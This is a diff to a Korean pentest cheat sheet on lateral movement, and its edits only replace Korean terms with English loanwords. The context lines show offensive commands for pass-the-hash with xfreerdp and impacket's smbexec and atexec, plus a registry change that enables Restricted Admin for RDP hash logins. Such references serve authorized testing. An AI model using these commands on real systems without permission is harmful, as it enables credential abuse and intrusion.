@@ -8,7 +8,7 @@
 
 ## Pass-the-Hash (PtH)
 
-NTLM 해시를 사용하여 인증하는 기법. 패스워드를 모르더라도 해시만으로 접근 가능하다.
+NTLM hash를 사용하여 인증하는 기법. password를 모르더라도 hash만으로 접근 가능하다.
 
 ```bash
 # evil-winrm (WinRM)
@@ -85,7 +85,7 @@ xfreerdp /u:<user> /p:'<pass>' /v:<ip> /cert-ignore /dynamic-resolution
 xfreerdp /u:<user> /pth:<ntlm_hash> /v:<ip> /cert-ignore
 ```
 
-Restricted Admin 모드가 꺼져있으면 레지스트리 수정 필요:
+Restricted Admin 모드가 꺼져있으면 Registry 수정 필요:
 ```cmd
 reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
 ```
@@ -115,7 +115,7 @@ Invoke-Command -ComputerName TARGET -Credential $cred -FilePath C:\scripts\enum.
 
 ## SMBExec
 
-SMB를 통한 반대화형 쉘. PSExec과 달리 디스크에 바이너리를 드롭하지 않음.
+SMB를 통한 반대화형 shell. PSExec과 달리 디스크에 binary를 드롭하지 않음.
 
 ```bash
 impacket-smbexec DOMAIN/user:pass@TARGET
@@ -138,7 +138,7 @@ impacket-atexec DOMAIN/user@TARGET -hashes :NTHASH "ipconfig"
 ## SSH
 
 ```bash
-# 패스워드
+# password
 ssh <user>@<ip>
 
 # SSH 키
